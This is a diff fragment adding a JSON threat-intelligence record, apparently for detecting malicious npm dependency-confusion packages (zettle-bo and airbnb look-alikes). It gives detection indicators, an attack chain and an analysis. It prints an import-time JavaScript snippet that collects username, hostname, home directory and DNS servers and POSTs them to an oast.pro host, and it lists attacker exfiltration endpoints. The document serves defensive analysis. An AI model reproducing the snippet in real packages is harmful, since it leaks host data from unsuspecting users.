+                    "Network requests to known webhook/SaaS endpoints (e.g., interactsh, burpcollaborator, pipedream, webhook.site) or attacker-controlled domains (e.g., 425a2.rt11.ml)",
+                    "Obfuscated JavaScript code in package entrypoints performing network exfiltration",
+                    "DNS queries to attacker-controlled subdomains for covert data exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or __init__.py containing os, https, requests, or dns modules with hardcoded external domains",
+                    "Obfuscated JavaScript in package entrypoints (e.g., variable/function names like _0xabc, _0xdef)",
+                    "References to interactsh, burpcollaborator, pipedream, webhook.site, or 425a2.rt11.ml in code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to 425a2.rt11.ml, burpcollaborator.net, pipedream.net, webhook.site",
+                    "DNS queries to subdomains of attacker-controlled domains (e.g., *.425a2.rt11.ml)",
+                    "Outbound requests to api.ipify.org for external IP collection"
+                  ],
+                  "how_to_detect": "Monitor for packages that access system or user information and make outbound network requests to known webhook/SaaS endpoints or attacker-controlled domains at install or import time. Flag obfuscated code in package entrypoints that performs network communication. Detect DNS queries to attacker-controlled subdomains, especially when correlated with suspicious package installation or import events. Use static and dynamic analysis to identify hardcoded domains and automated data exfiltration logic."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455419_snippet_2",
+              "source_package": "['@zettle-bo/account-settings', '@zettle-bo/account-statement', '@zettle-bo/apps', '@zettle-bo/bank-settings', '@zettle-bo/bootstrapper', '@zettle-bo/capital', '@zettle-bo/cash-register', '@zettle-bo/customers', '@zettle-bo/dashboard', '@zettle-bo/direct-debit', '@zettle-bo/integrations', '@zettle-bo/inventory', '@zettle-bo/invoices', '@zettle-bo/pp-profile-widget', '@zettle-bo/products', '@zettle-bo/react', '@zettle-bo/react-router-dom', '@zettle-bo/react-spa', '@zettle-bo/receipts', '@zettle-bo/routes', '@zettle-bo/sales-trends', '@zettle-bo/settings', '@zettle-bo/shell', '@zettle-bo/staff-account', '@zettle-bo/vertical-navigation', 'airbn-geetest3', 'airbnb-env', 'airbnb-erf', 'airbnb-i18n-polyglot', 'airbnb-l10n', 'airbnb-mediator', 'airbnb-moment-more-format'] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455419/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45783838629722595,
+              "code_similarity": 0.403812050819397,
+              "behavior_similarity": 0.5118647217750549,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//author-- whitehacker003@protonmail.com\nconst os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst trackingData = JSON.stringify({\n  p: packageJSON.name,\n  c: os.cpus(),\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: dns.getServers(),\n  r: packageJSON.__resolved,\n  v: packageJSON.version,\n  json: packageJSON,\n});\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\nvar options = {\n  hostname: 'cj56jbj5dpjnojrhvbp2t4fnmokpu14.oast.pro',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time, the code collects detailed system and environment information (CPU details, home directory, hostname, username, DNS servers, and package metadata), serializes it, and sends it via HTTPS POST to an external domain, resulting in exfiltration of sensitive host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive system and environment information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent. This enables reconnaissance of internal environments and can facilitate further targeted attacks.",
+                  "violated_expectations": "Legitimate packages do not collect and transmit host or environment information on import, especially to untrusted domains, and always require user consent for telemetry.",
+                  "similar_legitimate_use": "Some analytics or error reporting packages may collect limited telemetry, but this is always documented, opt-in, and never includes sensitive host details like usernames or DNS servers.",
+                  "key_indicators": [
+                    "Collection of sensitive system and environment data (CPU, home directory, hostname, username, DNS servers)",
+                    "Network exfiltration via HTTPS POST to non-standard domain (oast.pro)",
+                    "No user notification or consent for data collection or transmission",
+                    "Presence of code referencing os, dns, and process environment in package entry point"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (airbnb packages)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": [
+                    "@zettle-bo/account-settings",
+                    "@zettle-bo/account-statement",
+                    "@zettle-bo/apps",
+                    "@zettle-bo/bank-settings",
+                    "@zettle-bo/bootstrapper",
+                    "@zettle-bo/capital",
+                    "@zettle-bo/cash-register",
+                    "@zettle-bo/customers",
+                    "@zettle-bo/dashboard",
+                    "@zettle-bo/direct-debit",
+                    "@zettle-bo/integrations",
+                    "@zettle-bo/inventory",
+                    "@zettle-bo/invoices",
+                    "@zettle-bo/pp-profile-widget",
+                    "@zettle-bo/products",
+                    "@zettle-bo/react",
+                    "@zettle-bo/react-router-dom",
+                    "@zettle-bo/react-spa",
+                    "@zettle-bo/receipts",
+                    "@zettle-bo/routes",
+                    "@zettle-bo/sales-trends",
+                    "@zettle-bo/settings",
+                    "@zettle-bo/shell",
+                    "@zettle-bo/staff-account",
+                    "@zettle-bo/vertical-navigation",
+                    "airbn-geetest3",
+                    "airbnb-env",
+                    "airbnb-erf",
+                    "airbnb-i18n-polyglot",
+                    "airbnb-l10n",
+                    "airbnb-mediator",
+                    "airbnb-moment-more-format"
+                  ],
+                  "package_manager": "npm",
+                  "package_versions": "35.0.0 (zettle-bo packages), 1.0.0 (airbnb packages, assumed)",
+                  "why_malicious": "These packages are proof-of-concept (PoC) dependency confusion attacks that attempt to exfiltrate system information or download and execute code from external servers. While no outright malicious payload is present, the behavior is consistent with supply chain attack techniques and poses a risk to internal systems if installed. The packages make unsolicited network requests during installation or import, which can be used to confirm internal usage or leak sensitive environment data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed via dependency confusion, replacing or supplementing an internal package with an attacker-controlled version.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall or import-time code embedded in the malicious package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes during installation or import, performing network beaconing or exfiltrating system information to external servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives confirmation of internal package usage or detailed system data"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses the received confirmation or exfiltrated data for internal reconnaissance or as proof-of-concept for supply chain compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Final goal: enable further targeted attacks or demonstrate internal exposure"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited network requests to external domains during package installation (postinstall) or import",
+                    "Collection and exfiltration of system environment data (CPU, home directory, hostname, username, DNS servers) at import-time",
+                    "Use of package name in remote URLs as part of network beaconing (dependency confusion indicator)",
+                    "Presence of code in entry points that references os, dns, or process environment modules"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js or index.js in package root containing network request code",
+                    "References to external domains such as *.lupin.com or *.oast.pro in package source files",
+                    "Use of os, dns, or process environment modules in package entry points",
+                    "Presence of postinstall scripts or code in package.json or main entry files"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to domains matching *.lupin.com during installation",
+                    "HTTPS POST requests to domains matching *.oast.pro containing serialized system metadata",
+                    "Outbound connections to non-standard or attacker-controlled domains at install or import time"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests to external or non-standard domains during installation (postinstall) or import. Use static analysis to flag packages whose entry points (e.g., app.js, index.js) reference os, dns, or process environment modules and contain code for network exfiltration. Block or alert on packages with postinstall scripts or code that contacts external servers using the package name. Inspect network logs for HTTP/HTTPS requests to domains such as *.lupin.com and *.oast.pro, especially if requests contain serialized system or environment data."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
